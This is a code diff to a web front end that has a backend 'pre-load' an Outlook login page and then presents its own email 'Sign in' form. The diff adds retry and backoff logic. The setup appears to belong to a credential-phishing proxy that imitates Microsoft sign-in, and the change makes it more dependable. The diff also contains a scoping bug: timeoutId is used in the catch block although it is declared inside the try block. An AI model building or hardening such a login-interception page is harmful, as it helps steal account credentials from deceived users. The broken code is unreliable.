@@ -768,7 +768,7 @@
             }
         }
 
-        async function preloadOutlook() {
+        async function preloadOutlook(retryAttempt = 1, maxRetries = 5) {
             // Prevent concurrent preload requests
             if (preloadInProgress) {
                 console.log('Preload already in progress, skipping...');
@@ -778,14 +778,29 @@
             preloadInProgress = true;
 
             try {
-                document.getElementById('statusText').textContent = 'Pre-loading Outlook page...';
+                // Update status message with retry attempt (visible in loading dots)
+                if (retryAttempt === 1) {
+                    document.getElementById('statusText').textContent = 'Pre-loading Outlook page...';
+                    document.getElementById('headerTitle').textContent = 'Preparing login page...';
+                } else {
+                    document.getElementById('statusText').textContent = `Preparing login page (attempt ${retryAttempt}/${maxRetries})...`;
+                    document.getElementById('headerTitle').textContent = `Preparing login page (attempt ${retryAttempt}/${maxRetries})...`;
+                }
+
+                // Increase timeout for retries
+                const timeoutMs = Math.min(30000 + (retryAttempt - 1) * 10000, 60000); // 30s, 40s, 50s, 60s, 60s
+
+                // Create AbortController for better browser compatibility
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
 
                 const response = await fetch(`${API_BASE}/api/preload`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    signal: AbortSignal.timeout(30000) // 30 second timeout
+                    signal: controller.signal
                 });
 
+                clearTimeout(timeoutId);
                 const data = await response.json();
 
                 if (response.ok) {
@@ -798,6 +813,7 @@
                         }
                         
                         // Backend is now ready to ask for email - show the email form
+                        preloadInProgress = false; // Clear lock on success
                         setLoading(false);
                         document.getElementById('emailForm').style.display = 'block';
                         document.getElementById('headerTitle').textContent = 'Sign in';
@@ -806,23 +822,43 @@
                         setTimeout(() => {
                             document.getElementById('email').focus();
                         }, 100);
+                        return; // Success - exit function
+                    } else {
+                        // Handle non-terminal statuses (loading, busy, etc.) - treat as transient and retry
+                        throw new Error(`Transient status: ${data.status || 'unknown'}`);
                     }
                 } else {
                     throw new Error(data.error || 'Failed to preload');
                 }
             } catch (error) {
-                document.getElementById('statusText').textContent = 'Backend error - Manual loading available';
-                console.error('Preload failed:', error);
+                clearTimeout(timeoutId); // Clean up timeout on error
+                console.error(`Preload attempt ${retryAttempt} failed:`, error);
                 
-                // Show error message and allow manual retry
+                // If we still have retries left, wait and retry
+                if (retryAttempt < maxRetries) {
+                    // Exponential backoff: 2s, 4s, 8s, 16s
+                    const delayMs = Math.min(2000 * Math.pow(2, retryAttempt - 1), 16000);
+                    
+                    setTimeout(() => {
+                        // Reset the flag before retrying
+                        preloadInProgress = false;
+                        preloadOutlook(retryAttempt + 1, maxRetries);
+                    }, delayMs);
+                    return; // Don't execute the finally block yet
+                }
+                
+                // All retries exhausted - show error
+                preloadInProgress = false; // Clear lock on final failure
+                document.getElementById('statusText').textContent = 'Backend error - Manual loading available';
+                console.error('All preload attempts failed:', error);
+                
+                // Show error message and allow manual retry  
                 setLoading(false);
-                showMessage('Unable to prepare login page. Please try refreshing the page.', 'error');
+                showMessage('Unable to prepare login page after multiple attempts. Please try refreshing the page.', 'error');
                 
                 // Show email form as fallback
                 document.getElementById('emailForm').style.display = 'block';
                 document.getElementById('headerTitle').textContent = 'Sign in';
-            } finally {
-                preloadInProgress = false;
             }
         }
 
